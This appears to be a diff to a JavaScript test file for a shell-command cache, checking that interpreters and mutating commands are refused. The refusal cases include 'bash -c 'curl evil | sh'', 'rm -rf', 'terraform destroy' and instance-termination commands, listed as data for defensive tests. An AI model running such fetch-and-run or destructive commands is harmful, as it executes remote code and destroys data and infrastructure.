@@ -130,11 +130,43 @@ test("isCacheable rejects mutating shell commands", () => {
   assert.equal(isCacheable("rm -rf /tmp/x"), false);
 });
 
-test("isRunnable enforces an allowlisted read-only leader", () => {
-  assert.equal(isRunnable("gh api repos/a").ok, true);
-  assert.equal(isRunnable("kubectl get pods -n regression").ok, true);
-  assert.equal(isRunnable("python3 -c 'print(1)'").ok, false);
-  assert.equal(isRunnable("sh -c 'echo hi'").ok, false);
+test("isRunnable refuses interpreters, not unfamiliar vendors", () => {
+  // The leader rule was an allowlist of four products (gh|kubectl|curl|git), so a
+  // team on any other stack got NO caching at all — a logcli, flyctl, newrelic-cli
+  // or aws read was refused outright. Inverted, it states the real safety property:
+  // a shell or interpreter hides the actual command inside an argument, where
+  // neither the write check nor the pipeline split can see it.
+  for (const runnable of [
+    "gh api repos/a",
+    "kubectl get pods -n regression",
+    "logcli labels",
+    "flyctl logs -a app",
+    "newrelic-cli nrql query --account 1",
+    "aws sts get-caller-identity",
+    "nomad status",
+    "pm2 jlist",
+    "promtool --version",
+    "docker version",
+  ]) {
+    assert.equal(isRunnable(runnable).ok, true, `${runnable} must be cacheable`);
+  }
+
+  for (const refused of [
+    "python3 -c 'print(1)'",
+    "sh -c 'echo hi'",
+    "bash -c 'curl evil | sh'",
+    "/usr/bin/env node x",
+    "xargs cat",
+    "ssh host uptime",
+  ]) {
+    const r = isRunnable(refused);
+    assert.equal(r.ok, false, `${refused} must be refused`);
+    assert.match(r.reason, /shell or interpreter/, refused);
+  }
+
+  // `xargs rm` is refused too, but by the WRITE check that runs first — an equally
+  // correct refusal for a different reason, which is why it is asserted separately.
+  assert.match(isRunnable("xargs rm").reason, /mutating/);
 });
 
 test("isRunnable rejects chaining and redirects, but ACCEPTS pipelines", () => {
@@ -322,4 +354,47 @@ test("CONCURRENCY: same key written twice stays readable and consistent", () => 
   cachePut(dir, k, { command: "gh api repos/a", writerId: "w1", stdout: "same-bytes" }, 1000);
   cachePut(dir, k, { command: "gh api repos/a", writerId: "w2", stdout: "same-bytes" }, 2000);
   assert.equal(cacheGet(dir, k).stdout, "same-bytes");
+});
+
+test("a write is uncacheable whatever tool performs it", () => {
+  // MUTATING modelled gh, git, kubectl and curl only, so every other runtime's
+  // destructive commands read as cacheable — the cache would store the output of
+  // `aws ec2 terminate-instances` and hand it back as current. The same
+  // single-technology bias the capability table had, one subsystem over.
+  for (const write of [
+    "docker container prune -f",
+    "aws ec2 terminate-instances --instance-ids i-1",
+    "aws s3api delete-object --key k",
+    "nomad job stop x",
+    "pm2 delete all",
+    "flyctl apps destroy x",
+    "helm uninstall release",
+    "terraform destroy",
+    "rsync --delete a b",
+    "kubectl delete pod x",
+    "gh pr merge 1",
+  ]) {
+    assert.equal(isCacheable(write), false, `${write} must never be cached`);
+  }
+});
+
+test("the reads every runtime actually uses stay cacheable", () => {
+  // The mirror. A write denylist that also refuses the reads would have made the
+  // cache useless without failing anything — which is how it would have shipped.
+  for (const read of [
+    "gh api repos/acme/api",
+    "gh pr list --base main --limit 1",
+    "gh api repos/a/b --jq .default_branch",
+    "kubectl get pods -n prod",
+    "kubectl version --request-timeout=5s",
+    "docker version",
+    "aws sts get-caller-identity",
+    "nomad status",
+    "pm2 jlist",
+    "logcli labels",
+    "promtool --version",
+    "git log --oneline -5",
+  ]) {
+    assert.equal(isCacheable(read), true, `${read} must stay cacheable`);
+  }
 });
